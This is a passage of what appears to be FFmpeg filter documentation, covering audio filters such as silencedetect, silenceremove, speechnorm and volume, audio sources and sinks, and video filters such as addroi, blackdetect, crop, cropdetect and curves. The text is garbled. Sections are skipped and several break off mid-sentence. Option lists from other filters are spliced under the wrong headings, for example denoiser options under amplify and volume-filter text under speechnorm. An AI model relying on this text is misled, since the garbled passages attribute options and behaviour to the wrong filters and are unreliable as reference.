will be amplified, expanding dynamic range in upward direction.
Otherwise, in case of `downward` lower parts of signal will be reduced.

`range`

Set the level of gain reduction when the signal is below the threshold.
Default is 0.06125. Allowed range is from 0 to 1.
Setting this to 0 disables reduction and then filter behaves like expander.

`threshold`

If a signal rises above this level the gain reduction is released.
Default is 0.125. Allowed range is from 0 to 1.

`ratio`

Set a ratio about which the signal is reduced.
Default is 2. Allowed range is from 1 to 9000.

`attack`

Amount of milliseconds the signal has to rise above the threshold before gain
reduction stops.
Default is 20 milliseconds. Allowed range is from 0.01 to 9000.

`release`

Amount of milliseconds the signal has to fall below the threshold before the
reduction is increased again. Default is 250 milliseconds.
Allowed range is from 0.01 to 9000.

`makeup`

Set amount of amplification of signal after processing.
Default is 1. Allowed range is from 1 to 64.

`knee`

Curve the sharp knee around the threshold to enter gain reduction more softly.
Default is 2.828427125. Allowed range is from 1 to 8.

`detection`

Choose if exact signal should be taken for detection or an RMS like one.
Default is rms. Can be peak or rms.

`link`

Choose if the average level between all channels or the louder channel affects
the reduction.
Default is average. Can be average or maximum.

`level_sc`

Set sidechain gain. Default is 1. Range is from 0.015625 to 64.

#### [8.106.1 Commands](#toc-Commands-46)

This filter supports the all above options as [commands](#commands).

### [8.107 silencedetect](#toc-silencedetect)

Detect silence in an audio stream.

This filter logs a message when it detects that the input audio volume is less
or equal to a noise tolerance value for a duration greater or equal to the
minimum detected noise duration.

The printed times and duration are expressed in seconds. The
`lavfi.silence_start` or `lavfi.silence_start.X` metadata key
is set on the first frame whose timestamp equals or exceeds the detection
duration and it contains the timestamp of the first frame of the silence.

The `lavfi.silence_duration` or `lavfi.silence_duration.X`
and `lavfi.silence_end` or `lavfi.silence_end.X` metadata
keys are set on the first frame after the silence. If `mono` is
enabled, and each channel is evaluated separately, the `.X`
suffixed keys are used, and `X` corresponds to the channel number.

The filter accepts the following options:

`noise, n`

Set noise tolerance. Can be specified in dB (in case "dB" is appended to the
specified value) or amplitude ratio. Default is -60dB, or 0.001.

`duration, d`

Set silence duration until notification (default is 2 seconds). See
[(ffmpeg-utils)the Time duration section in the ffmpeg-utils(1) manual](ffmpeg-utils.html#time-duration-syntax)
for the accepted syntax.

`mono, m`

Process each channel separately, instead of combined. By default is disabled.

#### [8.107.1 Examples](#toc-Examples-31)

* Detect 5 seconds of silence with -50dB noise tolerance:
  ```
  silencedetect=n=-50dB:d=5

  ```
* Complete example with `ffmpeg` to detect silence with 0.0001 noise
  tolerance in `silence.mp3`:
  ```
  ffmpeg -i silence.mp3 -af silencedetect=noise=0.0001 -f null -

  ```

### [8.108 silenceremove](#toc-silenceremove)

Remove silence from the beginning, middle or end of the audio.

The filter accepts the following options:

`start_periods`

This value is used to indicate if audio should be trimmed at beginning of
the audio. A value of zero indicates no silence should be trimmed from the
beginning. When specifying a non-zero value, it trims audio up until it
finds non-silence. Normally, when trimming silence from beginning of audio
the start\_periods will be `1` but it can be increased to higher
values to trim all audio up to specific count of non-silence periods.
Default value is `0`.

`start_duration`

Specify the amount of time that non-silence must be detected before it stops
trimming audio. By increasing the duration, bursts of noises can be treated
as silence and trimmed off. Default value is `0`.

`start_threshold`

This indicates what sample value should be treated as silence. For digital
audio, a value of `0` may be fine but for audio recorded from analog,
you may wish to increase the value to account for background noise.
Can be specified in dB (in case "dB" is appended to the specified value)
or amplitude ratio. Default value is `0`.

`start_silence`

Specify max duration of silence at beginning that will be kept after
trimming. Default is 0, which is equal to trimming all samples detected
as silence.

`start_mode`

Specify mode of detection of silence end at start of multi-channel audio.
Can be any or all. Default is any.
With any, any sample from any channel that is detected as non-silence
will trigger end of silence trimming at start of audio stream.
With all, only if every sample from every channel is detected as non-silence
will trigger end of silence trimming at start of audio stream, limited usage.

`stop_periods`

Set the count for trimming silence from the end of audio. When specifying a
positive value, it trims audio after it finds specified silence period.
To remove silence from the middle of a file, specify a stop\_periods
that is negative. This value is then treated as a positive value and is
used to indicate the effect should restart processing as specified by
stop\_periods, making it suitable for removing periods of silence
in the middle of the audio.
Default value is `0`.

`stop_duration`

Specify a duration of silence that must exist before audio is not copied any
more. By specifying a higher duration, silence that is wanted can be left in
the audio.
Default value is `0`.

`stop_threshold`

This is the same as `start_threshold` but for trimming silence from
the end of audio.
Can be specified in dB (in case "dB" is appended to the specified value)
or amplitude ratio. Default value is `0`.

`stop_silence`

Specify max duration of silence at end that will be kept after
trimming. Default is 0, which is equal to trimming all samples detected
as silence.

`stop_mode`

Specify mode of detection of silence start after start of multi-channel audio.
Can be any or all. Default is all.
With any, any sample from any channel that is detected as silence
will trigger start of silence trimming after start of audio stream, limited usage.
With all, only if every sample from every channel is detected as silence
will trigger start of silence trimming after start of audio stream.

`detection`

Set how is silence detected.

`avg`

Mean of absolute values of samples in moving window.

#### [8.108.1 Examples](#toc-Examples-32)

* The following example shows how this filter can be used to start a recording
  that does not contain the delay at the start which usually occurs between
  pressing the record button and the start of the performance:
  ```
  silenceremove=start_periods=1:start_duration=5:start_threshold=0.02

  ```
* Trim all silence encountered from beginning to end where there is more than 1
  second of silence in audio:
  ```
  silenceremove=stop_periods=-1:stop_duration=1:stop_threshold=-90dB

  ```
* Trim all digital silence samples, using peak detection, from beginning to end
  where there is more than 0 samples of digital silence in audio and digital
  silence is detected in all channels at same positions in stream:
  ```
  silenceremove=window=0:detection=peak:stop_mode=all:start_mode=all:stop_periods=-1:stop_threshold=0

  ```
* Trim every 2nd encountered silence period from beginning to end where there is
  more than 1 second of silence per silence period in audio:
  ```
  silenceremove=stop_periods=-2:stop_duration=1:stop_threshold=-90dB

  ```
* Similar as above, but keep maximum of 0.5 seconds of silence from each trimmed period:

### [8.110 speechnorm](#toc-speechnorm)

Speech Normalizer.

This filter expands or compresses each half-cycle of audio samples
(local set of samples all above or all below zero and between two nearest zero crossings) depending
on threshold value, so audio reaches target peak value under conditions controlled by below options.

The filter accepts the following options:

`peak, p`

Set the expansion target peak value. This specifies the highest allowed absolute amplitude
level for the normalized audio input. Default value is 0.95. Allowed range is from 0.0 to 1.0.

`expansion, e`

Set the maximum expansion factor. Allowed range is from 1.0 to 50.0. Default value is 2.0.
This option controls maximum local half-cycle of samples expansion. The maximum expansion
would be such that local peak value reaches target peak value but never to surpass it and that
ratio between new and previous peak value does not surpass this option value.

`compression, c`

Set the maximum compression factor. Allowed range is from 1.0 to 50.0. Default value is 2.0.
This option controls maximum local half-cycle of samples compression. This option is used
only if `threshold` option is set to value greater than 0.0, then in such cases
when local peak is lower or same as value set by `threshold` all samples belonging to
that peak’s half-cycle will be compressed by current compression factor.

`threshold, t`

Set the threshold value. Default value is 0.0. Allowed range is from 0.0 to 1.0.
This option specifies which half-cycles of samples will be compressed and which will be expanded.
Any half-cycle samples with their local peak value below or same as this option value will be
compressed by current compression factor, otherwise, if greater than threshold value they will be
expanded with expansion factor so that it could reach peak target value but never surpass it.

`raise, r`

Set the expansion raising amount per each half-cycle of samples. Default value is 0.001.
Allowed range is from 0.0 to 1.0. This controls how fast expansion factor is raised per
each new half-cycle until it reaches `expansion` value.
Setting this options too high may lead to distortions.

`fall, f`

Set the compression raising amount per each half-cycle of samples. Default value is 0.001.
Allowed range is from 0.0 to 1.0. This controls how fast compression factor is raised per
each new half-cycle until it reaches `compression` value.

`channels, h`

Specify which channels to filter, by default all available channels are filtered.

`invert, i`

Enable inverted filtering, by default is disabled. This inverts interpretation of `threshold`
option. When enabled any half-cycle of samples with their local peak value below or same as
`threshold` option will be expanded otherwise it will be compressed.

`link, l`

Link channels when calculating gain applied to each filtered channel sample, by default is disabled.
When disabled each filtered channel gain calculation is independent, otherwise when this option
is enabled the minimum of all possible gains for each filtered channel is used.

`rms, m`

Set the expansion target RMS value. This specifies the highest allowed RMS level for the normalized
audio input. Default value is 0.0, thus disabled. Allowed range is from 0.0 to 1.0.

Set when the volume expression is evaluated.

It accepts the following values:

‘`once`’

only evaluate expression once during the filter initialization, or
when the ‘`volume`’ command is sent

‘`frame`’

evaluate expression for each incoming frame

Default value is ‘`once`’.

The volume expression can contain the following parameters.

`n`

frame number (starting at zero)

`nb_channels`

number of channels

`nb_consumed_samples`

number of samples consumed by the filter

`nb_samples`

number of samples in the current frame

`pos`

PTS at start of stream

`startt`

time at start of stream

`t`

frame time

`tb`

timestamp timebase

`volume`

last set volume value

Note that when `eval` is set to ‘`once`’ only the
sample\_rate and tb variables are available, all other
variables will evaluate to NAN.

#### [8.120.1 Commands](#toc-Commands-53)

This filter supports the following commands:

`volume`

Modify the volume expression.
The command accepts the same syntax of the corresponding option.

If the specified expression is not valid, it is kept at its current
value.

#### [8.120.2 Examples](#toc-Examples-36)

* Halve the input audio volume:
  ```
  volume=volume=0.5
  volume=volume=1/2
  volume=volume=-6.0206dB

  ```

  In all the above example the named key for `volume` can be
  omitted, for example like in:

  ```
  volume=0.5

  ```
* Increase input audio power by 6 decibels using fixed-point precision:
  ```
  volume=volume=6dB:precision=fixed

  ```
* Fade volume after time 10 with an annihilation period of 5 seconds:
  ```
  volume='if(lt(t,10),1,max(1-(t-10)/5,0))':eval=frame

  ```

### [8.121 volumedetect](#toc-volumedetect)

Detect the volume of the input video.

The filter has no parameters. It supports only 16-bit signed integer samples,
so the input will be converted when needed. Statistics about the volume will
be printed in the log when the input stream end is reached.

In particular it will show the mean volume (root mean square), maximum
volume (on a per-sample basis), and the beginning of a histogram of the
registered volume values (from the maximum value to a cumulated 1/1000 of
the samples).

All volumes are in decibels relative to the maximum PCM value.

#### [8.121.1 Examples](#toc-Examples-37)

Here is an excerpt of the output:

```
[Parsed_volumedetect_0  0xa23120] mean_volume: -27 dB
[Parsed_volumedetect_0  0xa23120] max_volume: -4 dB
[Parsed_volumedetect_0  0xa23120] histogram_4db: 6
[Parsed_volumedetect_0  0xa23120] histogram_5db: 62
[Parsed_volumedetect_0  0xa23120] histogram_6db: 286
[Parsed_volumedetect_0  0xa23120] histogram_7db: 1042
[Parsed_volumedetect_0  0xa23120] histogram_8db: 2551
[Parsed_volumedetect_0  0xa23120] histogram_9db: 4609
[Parsed_volumedetect_0  0xa23120] histogram_10db: 8409

```

It means that:

* The mean square energy is approximately -27 dB, or 10^-2.7.
* The largest sample is at -4 dB, or more precisely between -4 dB and -5 dB.
* There are 6 samples at -4 dB, 62 at -5 dB, 286 at -6 dB, etc.

In other words, raising the volume by +4 dB does not cause any clipping,
raising it by +5 dB causes clipping for 6 samples, etc.

## [9 Audio Sources](#toc-Audio-Sources)

Below is a description of the currently available audio sources.

### [9.1 abuffer](#toc-abuffer)

Buffer audio frames, and make them available to the filter chain.

This source is mainly intended for a programmatic use, in particular
through the interface defined in `libavfilter/buffersrc.h`.

It accepts the following parameters:

`time_base`

The timebase which will be used for timestamps of submitted frames. It must be
either a floating-point number or in numerator/denominator form.

`sample_rate`

The sample rate of the incoming audio buffers.

`sample_fmt`

The sample format of the incoming audio buffers.
Either a sample format name or its corresponding integer representation from
the enum AVSampleFormat in `libavutil/samplefmt.h`

`channel_layout`

The channel layout of the incoming audio buffers.
Either a channel layout name from channel\_layout\_map in
`libavutil/channel_layout.c` or its corresponding integer representation
from the AV\_CH\_LAYOUT\_\* macros in `libavutil/channel_layout.h`

`channels`

The number of channels of the incoming audio buffers.
If both channels and channel\_layout are specified, then they
must be consistent.

#### [9.1.1 Examples](#toc-Examples-38)

```
abuffer=sample_rate=44100:sample_fmt=s16p:channel_layout=stereo

```

will instruct the source to accept planar 16bit signed stereo at 44100Hz.
Since the sample format with name "s16p" corresponds to the number
6 and the "stereo" channel layout corresponds to the value 0x3, this is
equivalent to:

```
abuffer=sample_rate=44100:sample_fmt=6:channel_layout=0x3

```

### [9.2 aevalsrc](#toc-aevalsrc)

Generate an audio signal specified by an expression.

audio signal.

This source accepts the following options:

`exprs`

Set the ’|’-separated expressions list for each separate channel. In case the
`channel_layout` option is not specified, the selected channel layout

Set the channel layout. The number of channels in the specified layout
must be equal to the number of specified expressions.

`duration, d`

Note that the resulting duration may be greater than the specified
duration, as the generated audio is always cut at the end of a
complete frame.

If not specified, or the expressed duration is negative, the audio is
supposed to be generated forever.

`nb_samples, n`

Set the number of samples per channel per each output frame,
default to 1024.

## [10 Audio Sinks](#toc-Audio-Sinks)

Below is a description of the currently available audio sinks.

### [10.1 abuffersink](#toc-abuffersink)

Buffer audio frames, and make them available to the end of filter chain.

This sink is mainly intended for programmatic use, in particular
through the interface defined in `libavfilter/buffersink.h`
or the options system.

It accepts a pointer to an AVABufferSinkContext structure, which
defines the incoming buffers’ formats, to be passed as the opaque
parameter to `avfilter_init_filter` for initialization.

### [10.2 anullsink](#toc-anullsink)

Null audio sink; do absolutely nothing with the input audio. It is
mainly useful as a template and for use in analysis / debugging
tools.

## [11 Video Filters](#toc-Video-Filters)

When you configure your FFmpeg build, you can disable any of the
existing filters using `--disable-filters`.
The configure output will show the video filters included in your
build.

Below is a description of the currently available video filters.

### [11.1 addroi](#toc-addroi)

Mark a region of interest in a video frame.

The frame data is passed through unchanged, but metadata is attached
to the frame indicating regions of interest which can affect the
behaviour of later encoding. Multiple regions can be marked by
applying the filter multiple times.

`x`

Region distance in pixels from the left edge of the frame.

`y`

Region distance in pixels from the top edge of the frame.

`w`

Region width in pixels.

`h`

Region height in pixels.

The parameters x, y, w and h are expressions,
and may contain the following variables:

`iw`

Width of the input frame.

`ih`

Height of the input frame.

`qoffset`

Quantisation offset to apply within the region.

This must be a real value in the range -1 to +1. A value of zero
indicates no quality change. A negative value asks for better quality
(less quantisation), while a positive value asks for worse quality
(greater quantisation).

The range is calibrated so that the extreme values indicate the
largest possible offset - if the rest of the frame is encoded with the
worst possible quality, an offset of -1 indicates that this region
should be encoded with the best possible quality anyway. Intermediate
values are then interpolated in some codec-dependent way.

For example, in 10-bit H.264 the quantisation parameter varies between
-12 and 51. A typical qoffset value of -1/10 therefore indicates that
this region should be encoded with a QP around one-tenth of the full
range better than the rest of the frame. So, if most of the frame
were to be encoded with a QP of around 30, this region would get a QP
of around 24 (an offset of approximately -1/10 \* (51 - -12) = -6.3).
An extreme value of -1 would indicate that this region should be
encoded with the best possible quality regardless of the treatment of
the rest of the frame - that is, should be encoded at a QP of -12.

`clear`

If set to true, remove any existing regions of interest marked on the
frame before adding the new one.

#### [11.1.1 Examples](#toc-Examples-44)

* Mark the centre quarter of the frame as interesting.
  ```
  addroi=iw/4:ih/4:iw/2:ih/2:-1/10

  ```
* Mark the 100-pixel-wide region on the left edge of the frame as very
  uninteresting (to be encoded at much lower quality than the rest of
  the frame).
  ```
  addroi=0:0:100:ih:+1/5

  ```

### [11.2 alphaextract](#toc-alphaextract)

Extract the alpha component from the input as a grayscale video. This
is especially useful with the alphamerge filter.

### [11.3 alphamerge](#toc-alphamerge)

Add or replace the alpha component of the primary input with the
grayscale value of a second input. This is intended for use with
alphaextract to allow the transmission or storage of frame
sequences that have alpha in a format that doesn’t support an alpha
channel.

For example, to reconstruct full frames from a normal YUV-encoded video
and a separate video created with alphaextract, you might use:

```
movie=in_alpha.mkv [alpha]; [in][alpha] alphamerge [out]

```

### [11.4 amplify](#toc-amplify)

Amplify differences between current pixel and pixels of adjacent frames in
same pixel location.

For example radius of 3 will instruct filter to calculate average of 7 frames.

`factor`

Set factor to amplify difference. Default is 2. Allowed range is from 0 to 65535.

`threshold`

Set threshold for difference amplification. Any difference greater or equal to
this value will not alter source pixel. Default is 10.
Allowed range is from 0 to 65535.

`tolerance`

Set tolerance for difference amplification. Any difference lower to
this value will not alter source pixel. Default is 0.
Allowed range is from 0 to 65535.

`low`

Set lower limit for changing source pixel. Default is 65535. Allowed range is from 0 to 65535.
This option controls maximum possible value that will decrease source pixel value.

`high`

Set high limit for changing source pixel. Default is 65535. Allowed range is from 0 to 65535.
This option controls maximum possible value that will increase source pixel value.

`factor`
`threshold`
`tolerance`
`low`
`high`

`2b`

Set threshold B for 3rd plane. Default is 0.04.
Valid range is 0 to 5.

Threshold A is designed to react on abrupt changes in the input signal and
threshold B is designed to react on continuous changes in the input signal.

`s`

Set number of frames filter will use for averaging. Default is 9. Must be odd
number in range [5, 129].

`p`

Set what planes of frame filter will use for averaging. Default is all.

`a`

Set what variant of algorithm filter will use for averaging. Default is `p` parallel.
Alternatively can be set to `s` serial.

Parallel can be faster then serial, while other way around is never true.
Parallel will abort early on first change being greater then thresholds, while serial
will continue processing other side of frames if they are equal or below thresholds.

`0s`
`1s`
`2s`

Set sigma for 1st plane, 2nd plane or 3rd plane. Default is 32767.
Valid range is from 0 to 32767.

### [11.13 blackdetect](#toc-blackdetect)

Detect video intervals that are (almost) completely black. Can be
useful to detect chapter transitions, commercials, or invalid
recordings.

The filter outputs its detection analysis to both the log as well as
frame metadata. If a black segment of at least the specified minimum
duration is found, a line with the start and end timestamps as well
as duration is printed to the log with level `info`. In addition,
a log line with level `debug` is printed per frame showing the
black amount detected for that frame.

The filter also attaches metadata to the first frame of a black
segment with key `lavfi.black_start` and to the first frame
after the black segment ends with key `lavfi.black_end`. The
value is the frame’s timestamp. This metadata is added regardless
of the minimum duration specified.

The filter accepts the following options:

`black_min_duration, d`

Set the minimum detected black duration expressed in seconds. It must
be a non-negative floating point number.

Default value is 2.0.

`picture_black_ratio_th, pic_th`

Set the threshold for considering a picture "black".
Express the minimum value for the ratio:

```
nb_black_pixels / nb_pixels

```

for which a picture is considered black.
Default value is 0.98.

`pixel_black_th, pix_th`

Set the threshold for considering a pixel "black".

The threshold expresses the maximum pixel luma value for which a
pixel is considered "black". The provided value is scaled according to
the following equation:

```
absolute_threshold = luma_minimum_value + pixel_black_th * luma_range_size

```

luma\_range\_size and luma\_minimum\_value depend on
the input video format, the range is [0-255] for YUV full-range
formats and [16-235] for YUV non full-range formats.

Default value is 0.10.

The following example sets the maximum pixel threshold to the minimum
value, and detects only black intervals of 2 or more seconds:

```
blackdetect=d=2:pix_th=0.00

```

### [11.14 blackframe](#toc-blackframe)

Detect frames that are (almost) completely black. Can be useful to

the frame number of the detected frame, the percentage of blackness,
the position in the file if known or -1 and the timestamp in seconds.

In order to display the output lines, you need to set the loglevel at
least to the AV\_LOG\_INFO value.

The value represents the percentage of pixels in the picture that
are below the threshold value.

It accepts the following parameters:

### [11.36 colorkey](#toc-colorkey)

RGB colorspace color keying.
This filter operates on 8-bit RGB format frames by setting the alpha component of each pixel
which falls within the similarity radius of the key color to 0. The alpha value for pixels outside
the similarity radius depends on the value of the blend option.

The filter accepts the following options:

Set the radius from the key color within which other colors also have full transparency.
The computed distance is related to the unit fractional distance in 3D space between the RGB values
of the key color and the pixel’s color. Range is 0.01 to 1.0. 0.01 matches within a very small radius
around the exact key color, while 1.0 matches everything.
Default is `0.01`.

`blend`

Set how the alpha value for pixels that fall outside the similarity radius is computed.
0.0 makes pixels either fully transparent or fully opaque.
Higher values result in semi-transparent pixels, with greater transparency
the more similar the pixel color is to the key color.
Range is 0.0 to 1.0. Default is `0.0`.

#### [11.36.1 Examples](#toc-Examples-56)

### [11.47 coreimage](#toc-coreimage-1)

Video filtering on GPU using Apple’s CoreImage API on OSX.

Hardware acceleration is based on an OpenGL context. Usually, this means it is
processed by video hardware. However, software-based OpenGL implementations
exist which means there is no guarantee for hardware processing. It depends on
the respective OSX.

There are many filters and image generators provided by Apple that come with a
large variety of options. The filter has to be referenced by its name along
with its options.

The coreimage filter accepts the following options:

`list_filters`

List all available filters and generators along with all their respective
options as well as possible minimum and maximum values along with the default
values.

```
list_filters=true

```

`filter`

Specify all filters by their respective name and options.
Use list\_filters to determine all valid filter names and options.
Numerical options are specified by a float value and are automatically clamped
to their respective value range. Vector and color options have to be specified
by a list of space separated float values. Character escaping has to be done.
A special option name `default` is available to use default options for a
filter.

It is required to specify either `default` or at least one of the filter options.
All omitted options are used with their default values.
The syntax of the filter string is as follows:

```
filter=<NAME>@<OPTION>=<VALUE>[@<OPTION>=<VALUE>][@...][#<NAME>@<OPTION>=<VALUE>[@<OPTION>=<VALUE>][@...]][#...]

```

`output_rect`

Specify a rectangle where the output of the filter chain is copied into the
input image. It is given by a list of space separated float values:

```
output_rect=x\ y\ width\ height

```

If not given, the output rectangle equals the dimensions of the input image.
The output rectangle is automatically cropped at the borders of the input
image. Negative values are valid for each component.

```
output_rect=25\ 25\ 100\ 100

```

Several filters can be chained for successive processing without GPU-HOST
transfers allowing for fast processing of complex filter chains.
Currently, only filters with zero (generators) or exactly one (filters) input
image and one output image are supported. Also, transition filters are not yet
usable as intended.

Some filters generate output images with additional padding depending on the
respective filter kernel. The padding is automatically removed to ensure the
filter output has the same size as the input image.

For image generators, the size of the output image is determined by the
previous output image of the filter chain or the input image of the whole
filterchain, respectively. The generators do not use the pixel information of
this image to generate their output. However, the generated output is
blended onto this image, resulting in partial or complete coverage of the
output image.

The [coreimagesrc](#coreimagesrc) video source can be used for generating input images
which are directly fed into the filter chain. By using it, providing input
images by another video source or an input video is not required.

#### [11.47.1 Examples](#toc-Examples-59)

* List all filters available:
  ```
  coreimage=list_filters=true

  ```
* Use the CIBoxBlur filter with default options to blur an image:
  ```
  coreimage=filter=CIBoxBlur@default

  ```
* Use a filter chain with CISepiaTone at default values and CIVignetteEffect with
  its center at 100x100 and a radius of 50 pixels:
  ```
  coreimage=filter=CIBoxBlur@default#CIVignetteEffect@inputCenter=100\ 100@inputRadius=50

  ```
* Use nullsrc and CIQRCodeGenerator to create a QR code for the FFmpeg homepage,
  given as complete and escaped command-line for Apple’s standard bash shell:
  ```
  ffmpeg -f lavfi -i nullsrc=s=100x100,coreimage=filter=CIQRCodeGenerator@inputMessage=https\\\\\://FFmpeg.org/@inputCorrectionLevel=H -frames:v 1 QRCode.png

  ```

### [11.48 corr](#toc-corr)

Obtain the correlation between two input videos.

This filter takes two input videos.

Both input videos must have the same resolution and pixel format for
this filter to work correctly. Also it assumes that both inputs
have the same number of frames, which are compared one by one.

The obtained per component, average, min and max correlation is printed through
the logging system.

The filter stores the calculated correlation of each frame in frame metadata.

This filter also supports the [framesync](#framesync) options.

In the below example the input file `main.mpg` being processed is compared
with the reference file `ref.mpg`.

```
ffmpeg -i main.mpg -i ref.mpg -lavfi corr -f null -

```

### [11.49 cover\_rect](#toc-cover_005frect)

It accepts the following options:

`cover`

Filepath of the optional cover image, needs to be in yuv420.

`mode`

Set covering mode.

It accepts the following values:

‘`cover`’

cover it by the supplied image

‘`blur`’

cover it by interpolating the surrounding pixels

Default value is blur.

#### [11.49.1 Examples](#toc-Examples-60)

* Cover a rectangular object by the supplied image of a given video using `ffmpeg`:
  ```
  ffmpeg -i file.ts -vf find_rect=newref.pgm,cover_rect=cover.jpg:mode=cover new.mkv

  ```

### [11.50 crop](#toc-crop)

Crop the input video to given dimensions.

It accepts the following parameters:

`w, out_w`

The width of the output video. It defaults to `iw`.
This expression is evaluated only once during the filter
configuration, or when the ‘`w`’ or ‘`out_w`’ command is sent.

`h, out_h`

The height of the output video. It defaults to `ih`.
This expression is evaluated only once during the filter
configuration, or when the ‘`h`’ or ‘`out_h`’ command is sent.

`x`

The horizontal position, in the input video, of the left edge of the output
video. It defaults to `(in_w-out_w)/2`.
This expression is evaluated per-frame.

`y`

The vertical position, in the input video, of the top edge of the output video.
It defaults to `(in_h-out_h)/2`.
This expression is evaluated per-frame.

`keep_aspect`

If set to 1 will force the output display aspect ratio
to be the same of the input, by changing the output sample aspect
ratio. It defaults to 0.

`exact`

Enable exact cropping. If enabled, subsampled videos will be cropped at exact
width/height/x/y as specified and will not be rounded to nearest smaller value.
It defaults to 0.

The out\_w, out\_h, x, y parameters are
expressions containing the following constants:

`x`
`y`

The computed values for x and y. They are evaluated for
each new frame.

`in_w`
`in_h`

The input width and height.

`iw`
`ih`

These are the same as in\_w and in\_h.

`out_w`
`out_h`

The output (cropped) width and height.

`ow`
`oh`

These are the same as out\_w and out\_h.

`a`

same as iw / ih

`sar`

input sample aspect ratio

`dar`

input display aspect ratio, it is the same as (iw / ih) \* sar

`hsub`
`vsub`

horizontal and vertical chroma subsample values. For example for the
pixel format "yuv422p" hsub is 2 and vsub is 1.

`n`

The number of the input frame, starting from 0.

`pos`

the position in the file of the input frame, NAN if unknown; deprecated,
do not use

`t`

The timestamp expressed in seconds. It’s NAN if the input timestamp is unknown.

The expression for out\_w may depend on the value of out\_h,
and the expression for out\_h may depend on out\_w, but they
cannot depend on x and y, as x and y are
evaluated after out\_w and out\_h.

The x and y parameters specify the expressions for the
position of the top-left corner of the output (non-cropped) area. They
are evaluated for each frame. If the evaluated value is not valid, it
is approximated to the nearest valid value.

The expression for x may depend on y, and the expression
for y may depend on x.

#### [11.50.1 Examples](#toc-Examples-61)

#### [11.50.2 Commands](#toc-Commands-76)

This filter supports the following commands:

`w, out_w`
`h, out_h`
`x`
`y`

Set width/height of the output video and the horizontal/vertical position
in the input video.
The command accepts the same syntax of the corresponding option.

If the specified expression is not valid, it is kept at its current
value.

### [11.51 cropdetect](#toc-cropdetect)

Auto-detect the crop size.

It calculates the necessary cropping parameters and prints the
recommended parameters via the logging system. The detected dimensions
correspond to the non-black or video area of the input video according to mode.

It accepts the following parameters:

`mode`

Depending on mode crop detection is based on either the mere black value of surrounding pixels or a combination of motion vectors and edge pixels.

‘`black`’

Detect black pixels surrounding the playing video. For fine control use option limit.

‘`mvedges`’

Detect the playing video by the motion vectors inside the video and scanning for edge pixels typically forming the border of a playing video.

`limit`

Set higher black value threshold, which can be optionally specified
from nothing (0) to everything (255 for 8-bit based formats). An intensity
value greater to the set value is considered non-black. It defaults to 24.
You can also specify a value between 0.0 and 1.0 which will be scaled depending
on the bitdepth of the pixel format.

`round`

The value which the width/height should be divisible by. It defaults to
16. The offset is automatically adjusted to center the video. Use 2 to
get only even dimensions (needed for 4:2:2 video). 16 is best when
encoding to most video codecs.

`skip`

Set the number of initial frames for which evaluation is skipped.
Default is 2. Range is 0 to INT\_MAX.

`reset_count, reset`

Set the counter that determines after how many frames cropdetect will
reset the previously detected largest video area and start over to
detect the current optimal crop area. Default value is 0.

This can be useful when channel logos distort the video area. 0
indicates ’never reset’, and returns the largest area encountered during
playback.

`mv_threshold`

Set motion in pixel units as threshold for motion detection. It defaults to 8.

`low`
`high`

Set low and high threshold values used by the Canny thresholding
algorithm.

The high threshold selects the "strong" edge pixels, which are then
connected through 8-connectivity with the "weak" edge pixels selected
by the low threshold.

low and high threshold values must be chosen in the range
[0,1], and low should be lesser or equal to high.

Default value for low is `5/255`, and default value for high
is `15/255`.

#### [11.51.1 Examples](#toc-Examples-62)

* Find video area surrounded by black borders:
  ```
  ffmpeg -i file.mp4 -vf cropdetect,metadata=mode=print -f null -

  ```
* Find an embedded video area, generate motion vectors beforehand:
  ```
  ffmpeg -i file.mp4 -vf mestimate,cropdetect=mode=mvedges,metadata=mode=print -f null -

  ```
* Find an embedded video area, use motion vectors from decoder:
  ```
  ffmpeg -flags2 +export_mvs -i file.mp4 -vf cropdetect=mode=mvedges,metadata=mode=print -f null -

  ```

#### [11.51.2 Commands](#toc-Commands-77)

This filter supports the following commands:

`limit`

The command accepts the same syntax of the corresponding option.
If the specified expression is not valid, it is kept at its current value.

### [11.52 cue](#toc-cue-1)

Delay video filtering until a given wallclock timestamp. The filter first
passes on `preroll` amount of frames, then it buffers at most
`buffer` amount of frames and waits for the cue. After reaching the cue
it forwards the buffered frames and also any subsequent frames coming in its
input.

The filter can be used synchronize the output of multiple ffmpeg processes for
realtime output devices like decklink. By putting the delay in the filtering
chain and pre-buffering frames the process can pass on data to output almost
immediately after the target wallclock timestamp is reached.

Perfect frame accuracy cannot be guaranteed, but the result is good enough for
some use cases.

`cue`

The cue timestamp expressed in a UNIX timestamp in microseconds. Default is 0.

`preroll`

The duration of content to pass on as preroll expressed in seconds. Default is 0.

`buffer`

The maximum duration of content to buffer before waiting for the cue expressed
in seconds. Default is 0.

### [11.53 curves](#toc-curves-1)

Apply color adjustments using curves.

This filter is similar to the Adobe Photoshop and GIMP curves tools. Each
component (red, green and blue) has its values defined by N key points
tied from each other using a smooth curve. The x-axis represents the pixel
values from the input frame, and the y-axis the new pixel values to be set for
the output frame.

By default, a component curve is defined by the two points (0;0) and
(1;1). This creates a straight line where each original pixel value is
"adjusted" to its own value, which means no change to the image.

The filter allows you to redefine these two points and add some more. A new
curve will be defined to pass smoothly through all these new coordinates. The
new defined points need to be strictly increasing over the x-axis, and their
x and y values must be in the [0;1] interval. The curve is
formed by using a natural or monotonic cubic spline interpolation, depending
on the interp option (default: `natural`). The `natural`
spline produces a smoother curve in general while the monotonic (`pchip`)
spline guarantees the transitions between the specified points to be
monotonic. If the computed curves happened to go outside the vector spaces,
the values will be clipped accordingly.

The filter accepts the following options:

`preset`

Select one of the available color presets. This option can be used in addition
to the `r`, `g`, `b` parameters; in this case, the later
options takes priority on the preset values.
Available presets are:

‘`none`’
‘`color_negative`’
‘`cross_process`’
‘`darker`’
‘`increase_contrast`’
‘`lighter`’
‘`linear_contrast`’
‘`medium_contrast`’
‘`negative`’
‘`strong_contrast`’
‘`vintage`’

Default is `none`.

`master, m`

Set the master key points. These points will define a second pass mapping. It
is sometimes called a "luminance" or "value" mapping. It can be used with
`r`, `g`, `b` or `all` since it acts like a
post-processing LUT.

`red, r`

Set the key points for the red component.

`green, g`

Set the key points for the green component.

`blue, b`

Set the key points for the blue component.

`all`

Set the key points for all components (not including master).
Can be used in addition to the other key points component
options. In this case, the unset component(s) will fallback on this
`all` setting.

`psfile`

Specify a Photoshop curves file (`.acv`) to import the settings from.

`plot`

Save Gnuplot script of the curves in specified file.

`interp`

Specify the kind of interpolation. Available algorithms are:

‘`natural`’

Natural cubic spline using a piece-wise cubic polynomial that is twice continuously differentiable.

‘`pchip`’

Monotonic cubic spline using a piecewise cubic Hermite interpolating polynomial (PCHIP).

To avoid some filtergraph syntax conflicts, each key points list need to be
